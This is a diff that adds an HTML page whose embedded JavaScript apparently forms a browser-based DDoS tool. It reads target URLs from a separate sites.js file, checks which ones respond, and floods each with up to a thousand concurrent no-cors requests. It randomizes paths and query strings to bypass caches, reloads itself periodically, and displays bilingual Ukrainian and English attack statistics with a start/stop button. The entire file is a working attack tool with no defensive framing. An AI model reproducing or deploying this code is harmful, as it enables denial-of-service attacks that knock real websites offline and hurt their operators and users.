@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8"/>
+    <title>Ddos</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css"/>
+</head>
+<body>
+<div class="container is-fluid">
+    <div style="padding: 30px 0;" class="trigger-btn">
+        <h3 class="is-size-3" style="float: left;">Статистика / Statistics:</h3>
+        <button id="trigger-flood" class="button is-danger" style="float: right;">STOP</button>
+    </div>
+    <div style="clear: both;"></div>
+    <div id="stats"></div>
+</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" type="text/javascript"></script>
+<script src="sites.js" type="text/javascript"></script>
+<script type="text/javascript">
+  const CONSTANTS = {
+    VALIDATION_TIMEOUT: 10000,
+    RETRIES_LIMIT: 6,
+    PAGE_REFRESH_TIMEOUT: 10 * 60 * 1000,
+    CONCURRENCY_LIMIT: 1000,
+    IS_STOP_FLOOD: false,
+    FAILED_CONSECUTIVE_REQUESTS_LIMIT: 10,
+    PAUSE_TIMEOUT: 1000
+  }
+  let targets
+  $(document).ready(async function () {
+    targets = await getTargets()
+    start(targets)
+    triggerButton()
+  })
+
+  function triggerButton () {
+    const $triggerBtn = $('#trigger-flood')
+    $triggerBtn.click(function () {
+      CONSTANTS.IS_STOP_FLOOD = !CONSTANTS.IS_STOP_FLOOD
+      if (CONSTANTS.IS_STOP_FLOOD) {
+        $triggerBtn.removeClass('is-danger').addClass('is-dark').text('START')
+      } else {
+        $triggerBtn.removeClass('is-dark').addClass('is-danger').text('STOP')
+        startFlood(targets)
+      }
+    })
+  }
+
+  function start (targets) {
+    validateTargets(targets).then(() => {
+      if (Object.values(targets).every(target => !target.valid)) {
+        alert('Помилка атаки на всі сайти. Спробуйте перезавантажити сторінку чи використати VPN.')
+      }
+    })
+    startPageRefresh()
+    startPrintStats()
+    startFlood(targets)
+  }
+
+  function startFlood (targets) {
+    Object.values(targets).forEach(target => {
+      if (target.isCanceled) {
+        return
+      }
+      if (target.valid) {
+        flood(target)
+      } else {
+        delay(1000).then(() => startFlood([target]))
+      }
+    })
+  }
+
+  function validateTargets (targets) {
+    const promises = Object.values(targets).map(target => validateTarget(target))
+    return Promise.all(promises)
+  }
+
+  async function validateTarget (target) {
+    for (let retries = 0; retries < CONSTANTS.RETRIES_LIMIT; retries++) {
+      await fetchWithTimeout(target.uri, { timeout: CONSTANTS.VALIDATION_TIMEOUT, method: 'GET' }).then(() => {
+        target.valid = true
+      }).catch(() => {
+        target.valid = false
+      })
+      if (target.valid) {
+        return
+      }
+    }
+    target.isCanceled = true
+  }
+
+  function startPageRefresh () {
+    setTimeout(() => {
+      location.reload()
+    }, CONSTANTS.PAGE_REFRESH_TIMEOUT)
+  }
+
+  function startPrintStats () {
+    setInterval(printStats, 1000)
+  }
+
+  const queue = []
+  const keywords = ['id/', 'id', 'news/', 'news', 'api/', '', '']
+
+  async function fetchWithTimeout (resource, options) {
+    const controller = new AbortController()
+    const id = setTimeout(() => controller.abort(), options.timeout)
+    const payload = { method: 'GET', mode: 'no-cors', referrer: '', signal: controller.signal }
+    return fetch(resource, payload).then((response) => {
+      clearTimeout(id)
+      return response
+    }).catch((error) => {
+      clearTimeout(id)
+      throw error
+    })
+  }
+
+  async function flood (target) {
+    let failedConsecutiveRequests = 0
+    for (let i = 0; !target.isCanceled && !CONSTANTS.IS_STOP_FLOOD; ++i) {
+      if (queue.length > CONSTANTS.CONCURRENCY_LIMIT) {
+        await queue.shift()
+      }
+      if (failedConsecutiveRequests >= CONSTANTS.FAILED_CONSECUTIVE_REQUESTS_LIMIT) {
+        failedConsecutiveRequests = 0
+        await delay(CONSTANTS.PAUSE_TIMEOUT)
+      }
+      const keyword = keywords[Math.floor(Math.random() * keywords.length)]
+      const rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+      queue.push(fetchWithTimeout(target.uri + keyword + rand, { timeout: 1000 })
+        .catch((error) => {
+          target.lastError = error.code
+          if (error.code === 20) {
+            return
+          }
+          return { ok: false }
+        }).then((response) => {
+          if (response && !response.ok) {
+            target.numberOfErrors++
+            failedConsecutiveRequests++
+          } else {
+            failedConsecutiveRequests = 0
+          }
+          target.numberOfRequests++
+        })
+      )
+    }
+  }
+
+  function printStats () {
+    const tableRowsHTML = Object.values(targets).map(target => `
+    <tr class="${getTargetRowClass(target)}">
+        <td style="width: 60%; word-break: break-all">${target.uri}</td>
+        <td>${target.numberOfRequests}</td>
+        <td>${target.numberOfErrors}</td>
+        <td>${target.lastError}</td>
+    </tr>
+  `).join('')
+    const tableHTML = `
+    <table class="table is-fullwidth is-bordered">
+      <thead>
+          <tr>
+              <th>URL</th>
+              <th>Number of Requests</th>
+              <th>Number of Errors</th>
+              <th>Last error</th>
+          </tr>
+      </thead>
+      <tbody>${tableRowsHTML}</tbody>
+    </table>
+  `
+    const targetsList = Object.values(targets)
+    const validTargetsCount = targetsList.filter(target => target.valid).length
+    const invalidTargetCount = targetsList.filter(target => !target.valid && target.isCanceled).length
+    const validatingTargetCount = targetsList.length - validTargetsCount - invalidTargetCount
+    const countersHTML = CONSTANTS.IS_STOP_FLOOD ? 'Атака призупинена / Attack is on pause' : `
+    <h2>
+      ${targetsList.length} цілей:
+      <span class="has-text-success">Атакуємо ${validTargetsCount}</span>,
+      <span class="has-text-danger">Не доступно ${invalidTargetCount}</span>,
+      <span class="has-text-grey-light">Перевіряємо ${validatingTargetCount}</span>
+    </h2>
+  `
+    const statsHTML = `
+    ${countersHTML}
+    ${tableHTML}
+  `
+    $('#stats').html(statsHTML)
+  }
+
+  function getTargetRowClass (target) {
+    if (target.valid) {
+      return 'has-text-primary'
+    }
+    if (target.isCanceled) {
+      return 'has-text-danger'
+    }
+    return 'has-text-grey-light'
+  }
+
+  async function getTargets () {
+    const targets = {}
+    const list = await getTargetsList()
+    list.forEach(targetUri => targets[targetUri] = createTarget(targetUri))
+    return targets
+  }
+
+  function createTarget (targetUri) {
+    return { uri: targetUri, numberOfRequests: 0, numberOfErrors: 0, lastError: null, valid: false, isCanceled: false }
+  }
+
+  function delay (time) {
+    return new Promise(resolve => setTimeout(resolve, time))
+  }
+
+  function getTargetsList () {
+    const ourList = sites
+      .map(line => line.trim())
+      .filter(line => line && !line.startsWith('#'))
+
+    if (!ourList.every(food => food.startsWith('http'))) {
+      alert('Self ddos protection. Check the list of targets!')
+      return null
+    }
+    return ourList
+  }
+</script>
+</body>
+</html>
